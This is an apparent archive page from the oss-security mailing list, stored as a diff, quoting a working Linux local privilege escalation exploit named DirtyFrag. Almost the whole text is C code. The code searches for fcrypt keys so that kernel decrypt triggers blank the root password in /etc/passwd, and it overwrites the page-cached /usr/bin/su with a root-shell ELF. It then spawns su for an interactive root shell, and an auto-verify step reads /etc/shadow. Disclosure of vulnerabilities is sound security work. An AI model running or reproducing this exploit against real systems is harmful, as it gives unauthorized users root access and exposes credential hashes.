+&gt;
+&gt;         fcrypt_init_sboxes();
+&gt;         /* selftest */
+&gt;         {
+&gt;                 fcrypt_uctx ctx;
+&gt;                 uint8_t z[8] = {0};
+&gt;                 uint8_t cv[8] = { 0x0E, 0x09, 0x00, 0xC7, 0x3E, 0xF7,
+&gt; 0xED, 0x41 };
+&gt;                 uint8_t pv[8];
+&gt;                 fcrypt_user_setkey(&amp;ctx, z);
+&gt;                 fcrypt_user_decrypt(&amp;ctx, pv, cv);
+&gt;                 if (memcmp(pv, z, 8) != 0) { WARN("fcrypt selftest
+&gt; FAILED"); return 1; }
+&gt;         }
+&gt;         LOG("fcrypt selftest OK");
+&gt;
+&gt;         uint8_t Ka[8], Pa_out[8];
+&gt;         uint8_t Kb[8], Pb_out[8];
+&gt;         uint8_t Kc[8], Pc_out[8];
+&gt;         uint8_t Cb_actual[8], Cc_actual[8];
+&gt;
+&gt;         {
+&gt;                 uint64_t max_iters = 10000000000ULL;
+&gt;                 const char *e = getenv("LPE_MAX_ITERS");
+&gt;                 if (e) max_iters = strtoull(e, NULL, 0);
+&gt;                 uint64_t seed_base = (uint64_t)time(NULL) * 0x100000001ULL
+&gt; ^ (uint64_t)getpid();
+&gt;                 const char *se = getenv("LPE_SEED");
+&gt;                 if (se) seed_base = strtoull(se, NULL, 0);
+&gt;
+&gt;                 fprintf(stderr, "\n=== STAGE 1a: search K_A (chars 4-5 :=
+&gt; \"::\")  prob ~1.5e-5 ===\n");
+&gt;                 if (find_K_offline_generic(Ca, max_iters,
+&gt; fc_check_pa_nullok,
+&gt;                                         Ka, Pa_out, seed_base, "K_A") !=
+&gt; 0) {
+&gt;                         WARN("K_A search exhausted"); return 2;
+&gt;                 }
+&gt;
+&gt;                 /* After splice A is applied, the ciphertext that splice B
+&gt; will
+&gt;                  * see at file offset 6 is NOT the original Cb — it's the
+&gt; bytes
+&gt;                  * that splice A wrote to file offsets 6..11 (= Pa[2..7])
+&gt; plus
+&gt;                  * the original bytes 12..13 (= Cb[6..7]).  We must derive
+&gt;                  * Cb_actual and search K_B against it. */
+&gt;                 memcpy(Cb_actual, Pa_out + 2, 6);
+&gt;                 memcpy(Cb_actual + 6, Cb + 6, 2);
+&gt;                 LOG("Cb_actual (after splice A) =
+&gt; %02x%02x%02x%02x%02x%02x%02x%02x",
+&gt;
+&gt; Cb_actual[0],Cb_actual[1],Cb_actual[2],Cb_actual[3],
+&gt;
+&gt; Cb_actual[4],Cb_actual[5],Cb_actual[6],Cb_actual[7]);
+&gt;
+&gt;                 fprintf(stderr, "\n=== STAGE 1b: search K_B (chars 6-7 :=
+&gt; \"0:\")  prob ~1.5e-5 ===\n");
+&gt;                 if (find_K_offline_generic(Cb_actual, max_iters,
+&gt; fc_check_pb_nullok,
+&gt;                                         Kb, Pb_out, seed_base ^
+&gt; 0xa5a5a5a5a5a5a5a5ULL,
+&gt;                                         "K_B") != 0) {
+&gt;                         WARN("K_B search exhausted"); return 2;
+&gt;                 }
+&gt;
+&gt;                 /* Same chaining logic for splice C: after splice B, file
+&gt; offsets
+&gt;                  * 8..13 hold Pb[2..7]; offsets 14..15 still hold the
+&gt; original
+&gt;                  * bytes Cc[6..7]. */
+&gt;                 memcpy(Cc_actual, Pb_out + 2, 6);
+&gt;                 memcpy(Cc_actual + 6, Cc + 6, 2);
+&gt;                 LOG("Cc_actual (after splice B) =
+&gt; %02x%02x%02x%02x%02x%02x%02x%02x",
+&gt;
+&gt; Cc_actual[0],Cc_actual[1],Cc_actual[2],Cc_actual[3],
+&gt;
+&gt; Cc_actual[4],Cc_actual[5],Cc_actual[6],Cc_actual[7]);
+&gt;
+&gt;                 fprintf(stderr, "\n=== STAGE 1c: search K_C (chars 8-15 :=
+&gt; \"0:GGGGGG:\")  prob ~5.4e-8 ===\n");
+&gt;                 if (find_K_offline_generic(Cc_actual, max_iters,
+&gt; fc_check_pc_nullok,
+&gt;                                         Kc, Pc_out, seed_base ^
+&gt; 0x5a5a5a5a5a5a5a5aULL,
+&gt;                                         "K_C") != 0) {
+&gt;                         WARN("K_C search exhausted"); return 2;
+&gt;                 }
+&gt;         }
+&gt;
+&gt;         fprintf(stderr, "\n[+] Predicted post-corruption /etc/passwd line
+&gt; 1:\n    \"root");
+&gt;         /* chars 4-5 from P_A */
+&gt;         for (int i = 0; i &lt; 2; i++)
+&gt; fputc((Pa_out[i]&gt;=32&amp;&amp;Pa_out[i]&lt;127)?Pa_out[i]:'.', stderr);
+&gt;         /* chars 6-7 from P_B */
+&gt;         for (int i = 0; i &lt; 2; i++)
+&gt; fputc((Pb_out[i]&gt;=32&amp;&amp;Pb_out[i]&lt;127)?Pb_out[i]:'.', stderr);
+&gt;         /* chars 8-15 from P_C */
+&gt;         for (int i = 0; i &lt; 8; i++)
+&gt; fputc((Pc_out[i]&gt;=32&amp;&amp;Pc_out[i]&lt;127)?Pc_out[i]:'.', stderr);
+&gt;         fprintf(stderr, "/root:/bin/bash\"\n");
+&gt;
+&gt;         /* === STAGE 2 — THREE KERNEL TRIGGERS (in order A → B → C) ===
+&gt;          * Each trigger does a single in-place decrypt at the
+&gt;          * indicated /etc/passwd file offset.  Last-write-wins on
+&gt; overlapping
+&gt;          * bytes determines the final state.
+&gt;          */
+&gt;         fprintf(stderr, "\n=== STAGE 2a: kernel trigger A @ off %d (set
+&gt; chars 4-5 \"::\") ===\n", off_a);
+&gt;         memcpy(SESSION_KEY, Ka, 8);
+&gt;         if (do_one_trigger(rfd_ro, off_a, 8) &lt; 0) {
+&gt;                 WARN("kernel trigger A failed"); return 3;
+&gt;         }
+&gt;
+&gt;         fprintf(stderr, "\n=== STAGE 2b: kernel trigger B @ off %d (set
+&gt; chars 6-7 \"0:\") ===\n", off_b);
+&gt;         memcpy(SESSION_KEY, Kb, 8);
+&gt;         if (do_one_trigger(rfd_ro, off_b, 8) &lt; 0) {
+&gt;                 WARN("kernel trigger B failed"); return 3;
+&gt;         }
+&gt;
+&gt;         fprintf(stderr, "\n=== STAGE 2c: kernel trigger C @ off %d (set
+&gt; chars 8-15 \"0:GGGGGG:\") ===\n", off_c);
+&gt;         memcpy(SESSION_KEY, Kc, 8);
+&gt;         if (do_one_trigger(rfd_ro, off_c, 8) &lt; 0) {
+&gt;                 WARN("kernel trigger C failed"); return 3;
+&gt;         }
+&gt;
+&gt;         /* Verify: re-read line 1 of /etc/passwd via mmap. */
+&gt;         fprintf(stderr, "[*] /etc/passwd line 1 (root entry) AFTER:  '");
+&gt;         for (int i = 0; i &lt; 32; i++) {
+&gt;                 char c = ((const char *)map)[i];
+&gt;                 fputc((c == '\n') ? '$' : (c &gt;= 32 &amp;&amp; c &lt; 127 ? c : '.'),
+&gt; stderr);
+&gt;         }
+&gt;         fprintf(stderr, "'\n");
+&gt;
+&gt;         /* Sanity-check: chars 4-5 = "::", 6-7 = "0:", 8-9 = "0:", 15 =
+&gt; ':'. */
+&gt;         {
+&gt;                 const char *m = (const char *)map;
+&gt;                 int ok = (m[4] == ':' &amp;&amp; m[5] == ':' &amp;&amp;
+&gt;                                 m[6] == '0' &amp;&amp; m[7] == ':' &amp;&amp;
+&gt;                                 m[8] == '0' &amp;&amp; m[9] == ':' &amp;&amp;
+&gt;                                 m[15] == ':');
+&gt;                 if (!ok) {
+&gt;                         WARN("post-trigger sanity check failed — char
+&gt; layout off");
+&gt;                         return 4;
+&gt;                 }
+&gt;         }
+&gt;         fprintf(stderr,
+&gt;                         "\n[!!!] HIT — root entry now has empty passwd
+&gt; field, uid=0, "
+&gt;                         "gid=0, dir=/root, shell=/bin/bash.\n");
+&gt;
+&gt;         /* === STAGE 3 — VERIFY VIA getent passwd root === */
+&gt;         fprintf(stderr,
+&gt;                         "\n=== STAGE 3: independent verify via `getent
+&gt; passwd root` ===\n");
+&gt;         {
+&gt;                 int p[2];
+&gt;                 if (pipe(p) == 0) {
+&gt;                         pid_t pid = fork();
+&gt;                         if (pid == 0) {
+&gt;                                 close(p[0]);
+&gt;                                 dup2(p[1], 1);
+&gt;                                 dup2(p[1], 2);
+&gt;                                 close(p[1]);
+&gt;                                 execlp("getent", "getent", "passwd",
+&gt; "root", NULL);
+&gt;                                 _exit(127);
+&gt;                         }
+&gt;                         close(p[1]);
+&gt;                         char buf[1024];
+&gt;                         ssize_t r = read(p[0], buf, sizeof(buf) - 1);
+&gt;                         close(p[0]);
+&gt;                         int wstatus = 0;
+&gt;                         waitpid(pid, &amp;wstatus, 0);
+&gt;                         if (r &gt; 0) {
+&gt;                                 buf[r] = 0;
+&gt;                                 fprintf(stderr, "[getent passwd root] %s",
+&gt; buf);
+&gt;                         }
+&gt;                         fprintf(stderr,
+&gt;                                         "[+] PRIMITIVE proven: root entry
+&gt; has empty passwd field "
+&gt;                                         "via NSS.\n");
+&gt;                 }
+&gt;         }
+&gt;
+&gt;         /* Honour `--corrupt-only` arg or DIRTYFRAG_CORRUPT_ONLY=1 env so
+&gt;          * the chain wrapper can skip the in-process su PTY stage and exec
+&gt;          * /usr/bin/su itself.  Avoids the flaky posix_openpt bridge. */
+&gt;         {
+&gt;                 int co_flag = 0;
+&gt;                 for (int i = 1; i &lt; argc; i++)
+&gt;                         if (!strcmp(argv[i], "--corrupt-only")) { co_flag
+&gt; = 1; break; }
+&gt;                 const char *e = getenv("DIRTYFRAG_CORRUPT_ONLY");
+&gt;                 if (e &amp;&amp; *e == '1') co_flag = 1;
+&gt;                 if (co_flag) return 0;
+&gt;         }
+&gt;
+&gt;         /* === STAGE 4 — `su` (target=root, no password input) ===
+&gt;          * PAM common-auth contains "auth [success=2 default=ignore]
+&gt;          * pam_unix.so nullok" — so a target user with empty passwd field
+&gt;          * + nullok flag accepts an empty password.  We auto-inject a
+&gt;          * single newline on the "Password:" prompt and then bridge the
+&gt;          * resulting bash to the user's tty. */
+&gt;         fprintf(stderr,
+&gt;                         "\n=== STAGE 4: spawning interactive root shell
+&gt; via `su` "
+&gt;                         "(no password input needed) ===\n\n");
+&gt;         fflush(stderr);
+&gt;
+&gt;         int master = posix_openpt(O_RDWR | O_NOCTTY);
+&gt;         if (master &lt; 0 || grantpt(master) &lt; 0 || unlockpt(master) &lt; 0) {
+&gt;                 WARN("posix_openpt: %s", strerror(errno));
+&gt;                 return 5;
+&gt;         }
+&gt;         char *slave_name = ptsname(master);
+&gt;
+&gt;         struct winsize ws;
+&gt;         if (ioctl(STDIN_FILENO, TIOCGWINSZ, &amp;ws) == 0) {
+&gt;                 ioctl(master, TIOCSWINSZ, &amp;ws);
+&gt;         }
+&gt;
+&gt;         pid_t pid = fork();
+&gt;         if (pid &lt; 0) { WARN("fork: %s", strerror(errno)); return 5; }
+&gt;         if (pid == 0) {
+&gt;                 /* child */
+&gt;                 setsid();
+&gt;                 int slave = open(slave_name, O_RDWR);
+&gt;                 if (slave &lt; 0) _exit(127);
+&gt;                 ioctl(slave, TIOCSCTTY, 0);
+&gt;                 dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
+&gt;                 if (slave &gt; 2) close(slave);
+&gt;                 close(master);
+&gt;                 /* `su` with no args targets root.  PAM common-auth's
+&gt; pam_unix.so
+&gt;                  * nullok accepts the empty passwd we planted in
+&gt; /etc/passwd. */
+&gt;                 execlp("su", "su", NULL);
+&gt;                 _exit(127);
+&gt;         }
+&gt;
+&gt;         /* parent: bridge user's tty &lt;-&gt; master. */
+&gt;         struct termios saved_termios;
+&gt;         int saved_termios_ok = (tcgetattr(STDIN_FILENO, &amp;saved_termios) ==
+&gt; 0);
+&gt;         if (saved_termios_ok) {
+&gt;                 struct termios raw = saved_termios;
+&gt;                 cfmakeraw(&amp;raw);
+&gt;                 tcsetattr(STDIN_FILENO, TCSANOW, &amp;raw);
+&gt;         }
+&gt;
+&gt;         int auto_pw_sent = 0;
+&gt;         int stdin_eof = 0;          /* set when stdin closes (e.g.
+&gt; /dev/null) */
+&gt;         char buf[4096];
+&gt;         /* If LPE_AUTO_VERIFY=1 is set, the bridge will inject
+&gt;          * `id; whoami; exit\n` so it can prove uid=0 non-interactively
+&gt;          * (e.g. when stdin is /dev/null in CI). */
+&gt;         int auto_verify = 0;
+&gt;         {
+&gt;                 const char *e = getenv("LPE_AUTO_VERIFY");
+&gt;                 if (e &amp;&amp; *e == '1') auto_verify = 1;
+&gt;         }
+&gt;         int verify_sent = 0;
+&gt;         int total_ms = 0;
+&gt;         for (;;) {
+&gt;                 struct pollfd pfds[2] = {
+&gt;                         { stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
+&gt;                         { master,       POLLIN, 0 },
+&gt;                 };
+&gt;                 int pr = poll(pfds, 2, 200);
+&gt;                 if (pr &lt; 0 &amp;&amp; errno != EINTR) break;
+&gt;                 total_ms += 200;
+&gt;
+&gt;                 if (pfds[1].revents &amp; POLLIN) {
+&gt;                         ssize_t n = read(master, buf, sizeof(buf));
+&gt;                         if (n &lt;= 0) break;
+&gt;                         (void)write(STDOUT_FILENO, buf, n);
+&gt;                         if (!auto_pw_sent &amp;&amp; (size_t)n &lt; sizeof(buf)) {
+&gt;                                 buf[n] = 0;
+&gt;                                 if (strstr(buf, "Password") || strstr(buf,
+&gt; "password")) {
+&gt;                                         /* Empty password — PAM nullok
+&gt; will accept it.
+&gt;                                          * (When pam_unix sees an empty
+&gt; passwd field plus
+&gt;                                          * nullok it skips the prompt
+&gt; entirely; this branch
+&gt;                                          * handles the case where some
+&gt; other PAM module
+&gt;                                          * prints a prompt anyway.) */
+&gt;                                         (void)write(master, "\n", 1);
+&gt;                                         auto_pw_sent = 1;
+&gt;                                 }
+&gt;                         }
+&gt;                 }
+&gt;                 if (!stdin_eof &amp;&amp; (pfds[0].revents &amp; POLLIN)) {
+&gt;                         ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
+&gt;                         if (n &lt;= 0) {
+&gt;                                 /* stdin EOF — stop reading from it but
+&gt; keep bridging
+&gt;                                  * master → stdout so su can still finish
+&gt; auth and run
+&gt;                                  * the optional auto-verify command. */
+&gt;                                 stdin_eof = 1;
+&gt;                         } else {
+&gt;                                 (void)write(master, buf, n);
+&gt;                         }
+&gt;                 }
+&gt;                 if (pfds[1].revents &amp; (POLLHUP | POLLERR)) break;
+&gt;
+&gt;                 /* Auto-verify: ~1 s after spawn, send `id; whoami;
+&gt; exit\n` so
+&gt;                  * the bridge captures uid=0 evidence non-interactively
+&gt; even
+&gt;                  * when pam_unix's blank-passwd path skips the prompt. */
+&gt;                 if (auto_verify &amp;&amp; !verify_sent &amp;&amp; total_ms &gt;= 1000) {
+&gt;                         const char cmd[] = "id; whoami; cat /etc/shadow |
+&gt; head -2; exit\n";
+&gt;                         (void)write(master, cmd, sizeof(cmd) - 1);
+&gt;                         verify_sent = 1;
+&gt;                 }
+&gt;
+&gt;                 int status;
+&gt;                 pid_t w = waitpid(pid, &amp;status, WNOHANG);
+&gt;                 if (w == pid) {
+&gt;                         for (int i = 0; i &lt; 5; i++) {
+&gt;                                 struct pollfd pf = { master, POLLIN, 0 };
+&gt;                                 if (poll(&amp;pf, 1, 50) &lt;= 0) break;
+&gt;                                 ssize_t n = read(master, buf, sizeof(buf));
+&gt;                                 if (n &lt;= 0) break;
+&gt;                                 (void)write(STDOUT_FILENO, buf, n);
+&gt;                         }
+&gt;                         break;
+&gt;                 }
+&gt;         }
+&gt;         if (saved_termios_ok) {
+&gt;                 tcsetattr(STDIN_FILENO, TCSANOW, &amp;saved_termios);
+&gt;         }
+&gt;         close(master);
+&gt;         return 0;
+&gt; }
+&gt; /*
+&gt;  * DirtyFrag chain — uid=1000 → root.
+&gt;  *
+&gt;  * 1. ESP path  (authencesn AF_ALG --corrupt-only): overwrites the first
+&gt;  *    160 bytes of /usr/bin/su's page-cache with a static x86_64 root-
+&gt;  *    shell ELF.  Works on every distro tested regardless of PAM nullok
+&gt;  *    or /etc/passwd contents — once invoked, the patched setuid-root
+&gt;  *    /usr/bin/su just execs /bin/sh as uid 0.
+&gt;  *
+&gt;  * 2. rxrpc path  (Ubuntu fallback): if AF_ALG is sandboxed and the ESP
+&gt;  *    path can't reach the page cache, fall back to the rxrpc/rxkad
+&gt;  *    nullok primitive that patches /etc/passwd's root entry empty.
+&gt;  *    PAM nullok then accepts the empty password during `su -`.
+&gt;  *
+&gt;  * 3. Once either target is corrupted, spawn `/usr/bin/su -` inside a
+&gt;  *    fresh PTY and bridge the user's tty to it.  The bridge handles
+&gt;  *    both the patched-su (no PAM at all) and the patched-passwd (PAM
+&gt;  *    nullok) cases uniformly, and works even when the caller is in a
+&gt;  *    background process group of an ssh-allocated PTY.
+&gt;  *
+&gt;  */
+&gt; #define _GNU_SOURCE
+&gt; #include &lt;stdio.h&gt;
+&gt; #include &lt;stdlib.h&gt;
+&gt; #include &lt;string.h&gt;
+&gt; #include &lt;unistd.h&gt;
+&gt; #include &lt;errno.h&gt;
+&gt; #include &lt;fcntl.h&gt;
+&gt; #include &lt;sched.h&gt;
+&gt; #include &lt;poll.h&gt;
+&gt; #include &lt;signal.h&gt;
+&gt; #include &lt;termios.h&gt;
+&gt; #include &lt;sys/ioctl.h&gt;
+&gt; #include &lt;sys/wait.h&gt;
+&gt; #include &lt;sys/types.h&gt;
+&gt; #include &lt;stdint.h&gt;
+&gt;
+&gt; extern int su_lpe_main(int argc, char **argv);
+&gt; extern int rxrpc_lpe_main(int argc, char **argv);
+&gt;
+&gt; /*
+&gt;  * The 8 bytes our su payload places at file offset 0x78 — the first
+&gt;  * instructions of the embedded shell ELF.  Sequence:
+&gt;  *   31 ff   xor edi, edi
+&gt;  *   31 f6   xor esi, esi
+&gt;  *   31 c0   xor eax, eax
+&gt;  *   b0 6a   mov al, 0x6a   (setgid)
+&gt;  * Distros' original /usr/bin/su has different bytes here, so this is
+&gt;  * a reliable post-patch marker.
+&gt;  *
+&gt;  * (We don't check offset 0 because /usr/bin/su already has the ELF
+&gt;  * magic there — both before and after we patch.)
+&gt;  */
+&gt; static const uint8_t su_marker[8] = {
+&gt;         0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
+&gt; };
+&gt;
+&gt; static int su_already_patched(void)
+&gt; {
+&gt;         int fd = open("/usr/bin/su", O_RDONLY);
+&gt;         if (fd &lt; 0)
+&gt;                 return 0;
+&gt;         uint8_t got[8];
+&gt;         ssize_t n = pread(fd, got, sizeof(got), 0x78);
+&gt;         close(fd);
+&gt;         if (n != sizeof(got))
+&gt;                 return 0;
+&gt;         return memcmp(got, su_marker, sizeof(su_marker)) == 0;
+&gt; }
+&gt;
+&gt; static int passwd_already_patched(void)
+&gt; {
+&gt;         int fd = open("/etc/passwd", O_RDONLY);
+&gt;         if (fd &lt; 0)
+&gt;                 return 0;
+&gt;         char head[16];
+&gt;         ssize_t n = pread(fd, head, sizeof(head), 0);
+&gt;         close(fd);
+&gt;         if (n &lt; 9)
+&gt;                 return 0;
+&gt;         return memcmp(head, "root::0:0", 9) == 0;
+&gt; }
+&gt;
+&gt; static int either_target_patched(void)
+&gt; {
+&gt;         return su_already_patched() || passwd_already_patched();
+&gt; }
+&gt;
+&gt; static void silence_stderr(int *saved_fd)
+&gt; {
+&gt;         *saved_fd = dup(STDERR_FILENO);
+&gt;         int dn = open("/dev/null", O_WRONLY);
+&gt;         if (dn &gt;= 0) {
+&gt;                 dup2(dn, STDERR_FILENO);
+&gt;                 close(dn);
+&gt;         }
+&gt; }
+&gt;
+&gt; static void restore_stderr(int saved_fd)
+&gt; {
+&gt;         if (saved_fd &gt;= 0) {
+&gt;                 dup2(saved_fd, STDERR_FILENO);
+&gt;                 close(saved_fd);
+&gt;         }
+&gt; }
+&gt;
+&gt; static char **append_corrupt_only(int argc, char **argv, int *new_argc)
+&gt; {
+&gt;         static char *flag = "--corrupt-only";
+&gt;         static char *buf[64];
+&gt;         int n = argc &lt; 60 ? argc : 60;
+&gt;         for (int i = 0; i &lt; n; i++)
+&gt;                 buf[i] = argv[i];
+&gt;         buf[n] = flag;
+&gt;         buf[n + 1] = NULL;
+&gt;         *new_argc = n + 1;
+&gt;         return buf;
+&gt; }
+&gt;
+&gt; static void exec_su_login(void)
+&gt; {
+&gt;         const char *paths[] = {
+&gt;                 "/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
+&gt;         };
+&gt;         for (int i = 0; paths[i]; i++)
+&gt;                 execl(paths[i], "su", "-", (char *)NULL);
+&gt;         execlp("su", "su", "-", (char *)NULL);
+&gt; }
+&gt;
+&gt; /*
+&gt;  * Spawn `/usr/bin/su -` in a fresh PTY and bridge our tty to it.
+&gt;  */
+&gt; static int run_root_pty(void)
+&gt; {
+&gt;         int master = posix_openpt(O_RDWR | O_NOCTTY);
+&gt;         if (master &lt; 0)
+&gt;                 return -1;
+&gt;         if (grantpt(master) &lt; 0 || unlockpt(master) &lt; 0) {
+&gt;                 close(master);
+&gt;                 return -1;
+&gt;         }
+&gt;         char *slave_name = ptsname(master);
+&gt;         if (!slave_name) {
+&gt;                 close(master);
+&gt;                 return -1;
+&gt;         }
+&gt;
+&gt;         struct winsize ws;
+&gt;         if (ioctl(STDIN_FILENO, TIOCGWINSZ, &amp;ws) == 0)
+&gt;                 ioctl(master, TIOCSWINSZ, &amp;ws);
+&gt;
+&gt;         pid_t pid = fork();
+&gt;         if (pid &lt; 0) {
+&gt;                 close(master);
+&gt;                 return -1;
+&gt;         }
+&gt;         if (pid == 0) {
+&gt;                 setsid();
+&gt;                 int slave = open(slave_name, O_RDWR);
+&gt;                 if (slave &lt; 0)
+&gt;                         _exit(127);
+&gt;                 ioctl(slave, TIOCSCTTY, 0);
+&gt;                 dup2(slave, 0);
+&gt;                 dup2(slave, 1);
+&gt;                 dup2(slave, 2);
+&gt;                 if (slave &gt; 2)
+&gt;                         close(slave);
+&gt;                 close(master);
+&gt;                 exec_su_login();
+&gt;                 _exit(127);
+&gt;         }
+&gt;
+&gt;         signal(SIGTTOU, SIG_IGN);
+&gt;         signal(SIGTTIN, SIG_IGN);
+&gt;         signal(SIGPIPE, SIG_IGN);
+&gt;         signal(SIGHUP,  SIG_IGN);
+&gt;         (void)setpgid(0, 0);
+&gt;         (void)tcsetpgrp(STDIN_FILENO, getpid());
+&gt;
+&gt;         struct termios saved_termios;
+&gt;         int restore_termios = 0;
+&gt;         if (tcgetattr(STDIN_FILENO, &amp;saved_termios) == 0) {
+&gt;                 struct termios raw = saved_termios;
+&gt;                 cfmakeraw(&amp;raw);
+&gt;                 if (tcsetattr(STDIN_FILENO, TCSANOW, &amp;raw) == 0)
+&gt;                         restore_termios = 1;
+&gt;         }
+&gt;
+&gt;         int auto_pw_sent = 0;
+&gt;         int stdin_eof = 0;
+&gt;         int saw_master_output = 0;
+&gt;         int total_ms = 0;
+&gt;         char buf[4096];
+&gt;
+&gt;         for (;;) {
+&gt;                 struct pollfd pfds[2] = {
+&gt;                         { stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
+&gt;                         { master,                        POLLIN, 0 },
+&gt;                 };
+&gt;                 int pr = poll(pfds, 2, 200);
+&gt;                 if (pr &lt; 0 &amp;&amp; errno != EINTR)
+&gt;                         break;
+&gt;                 total_ms += 200;
+&gt;
+&gt;                 if (pfds[1].revents &amp; POLLIN) {
+&gt;                         ssize_t n = read(master, buf, sizeof(buf));
+&gt;                         if (n &lt;= 0)
+&gt;                                 break;
+&gt;                         saw_master_output = 1;
+&gt;                         (void)write(STDOUT_FILENO, buf, n);
+&gt;                         if (!auto_pw_sent &amp;&amp; n &lt; (ssize_t)sizeof(buf)) {
+&gt;                                 buf[n] = 0;
+&gt;                                 if (strstr(buf, "Password") ||
+&gt;                                                 strstr(buf, "password")) {
+&gt;                                         (void)write(master, "\n", 1);
+&gt;                                         auto_pw_sent = 1;
+&gt;                                 }
+&gt;                         }
+&gt;                 }
+&gt;                 if (!stdin_eof &amp;&amp; (pfds[0].revents &amp; POLLIN)) {
+&gt;                         ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
+&gt;                         if (n &lt;= 0)
+&gt;                                 stdin_eof = 1;
+&gt;                         else
+&gt;                                 (void)write(master, buf, n);
+&gt;                 }
+&gt;                 if (pfds[1].revents &amp; (POLLHUP | POLLERR))
+&gt;                         break;
+&gt;
+&gt;                 if (!auto_pw_sent &amp;&amp; !saw_master_output &amp;&amp; total_ms &gt;=
+&gt; 1500) {
+&gt;                         (void)write(master, "\n", 1);
+&gt;                         auto_pw_sent = 1;
+&gt;                 }
+&gt;
+&gt;                 int status;
+&gt;                 pid_t w = waitpid(pid, &amp;status, WNOHANG);
+&gt;                 if (w == pid) {
+&gt;                         for (int i = 0; i &lt; 5; i++) {
+&gt;                                 struct pollfd pf = { master, POLLIN, 0 };
+&gt;                                 if (poll(&amp;pf, 1, 50) &lt;= 0)
+&gt;                                         break;
+&gt;                                 ssize_t n = read(master, buf, sizeof(buf));
+&gt;                                 if (n &lt;= 0)
+&gt;                                         break;
+&gt;                                 (void)write(STDOUT_FILENO, buf, n);
+&gt;                         }
+&gt;                         break;
+&gt;                 }
+&gt;         }
+&gt;
+&gt;         if (restore_termios)
+&gt;                 tcsetattr(STDIN_FILENO, TCSANOW, &amp;saved_termios);
+&gt;         close(master);
+&gt;         return 0;
+&gt; }
+&gt;
+&gt; int main(int argc, char **argv)
+&gt; {
+&gt;         int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
+&gt;         int force_esp = 0, force_rxrpc = 0;
+&gt;         int saved_err = -1;
+&gt;         int rc = 1;
+&gt;         int new_argc;
+&gt;         char **co_argv;
+&gt;
+&gt;         for (int i = 1; i &lt; argc; i++) {
+&gt;                 if (!strcmp(argv[i], "--force-esp"))
+&gt;                         force_esp = 1;
+&gt;                 else if (!strcmp(argv[i], "--force-rxrpc"))
+&gt;                         force_rxrpc = 1;
+&gt;                 else if (!strcmp(argv[i], "-v") ||
+&gt;                                 !strcmp(argv[i], "--verbose"))
+&gt;                         verbose = 1;
+&gt;         }
+&gt;
+&gt;         if (getuid() == 0) {
+&gt;                 execlp("/bin/bash", "bash", (char *)NULL);
+&gt;                 _exit(1);
+&gt;         }
+&gt;
+&gt;         co_argv = append_corrupt_only(argc, argv, &amp;new_argc);
+&gt;
+&gt;         if (!verbose)
+&gt;                 silence_stderr(&amp;saved_err);
+&gt;
+&gt;         if (force_rxrpc) {
+&gt;                 rc = rxrpc_lpe_main(new_argc, co_argv);
+&gt;                 for (int i = 0; !passwd_already_patched() &amp;&amp; i &lt; 3; i++)
+&gt;                         rc = rxrpc_lpe_main(new_argc, co_argv);
+&gt;         } else if (force_esp) {
+&gt;                 rc = su_lpe_main(new_argc, co_argv);
+&gt;         } else {
+&gt;                 rc = su_lpe_main(new_argc, co_argv);
+&gt;                 if (!su_already_patched()) {
+&gt;                         rc = rxrpc_lpe_main(new_argc, co_argv);
+&gt;                         for (int i = 0; !passwd_already_patched() &amp;&amp; i &lt;
+&gt; 3; i++)
+&gt;                                 rc = rxrpc_lpe_main(new_argc, co_argv);
+&gt;                 }
+&gt;         }
+&gt;
+&gt;         int patched = either_target_patched();
+&gt;
+&gt;         if (!verbose)
+&gt;                 restore_stderr(saved_err);
+&gt;
+&gt;         if (patched) {
+&gt;                 (void)run_root_pty();
+&gt;                 return 0;
+&gt;         }
+&gt;
+&gt;         dprintf(2, "dirtyfrag: failed (rc=%d)\n", rc);
+&gt;         return rc ? rc : 1;
+&gt; }
+&gt; ```
+&gt;
+&gt;
+
+-- 
+*Sandipan Roy*
+
+Senior Product Security Engineer, Product Security
+
+Secure Engineering - Incident Response
+
+Email: sandipan&#64;...hat.com
+
+PGP:0x4B5C7470051BB332 &lt;<a href="https://bytehackr.fedorapeople.org/saroy.asc" rel="nofollow">https://bytehackr.fedorapeople.org/saroy.asc</a>&gt;
+
+*secalert&#64;...hat.com &lt;secalert&#64;...hat.com&gt;* For Urgent Response.
+&lt;<a href="https://www.redhat.com/" rel="nofollow">https://www.redhat.com/</a>&gt;
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
